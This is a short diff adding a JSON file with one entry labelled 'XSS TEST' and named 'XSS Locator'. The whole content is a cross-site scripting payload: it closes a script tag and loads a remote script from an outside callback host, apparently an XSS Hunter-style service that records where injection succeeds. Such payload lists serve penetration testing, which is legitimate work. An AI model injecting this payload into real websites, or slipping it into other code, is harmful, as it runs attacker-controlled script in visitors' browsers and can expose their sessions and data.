@@ -1,0 +1,6 @@
+[ {
+      "description" : "XSS TEST",
+      "name" : "XSS Locator",
+      "vector" : "</SCRIPT><script src=https://alertwids.xss.ht></script>"
+
+}]
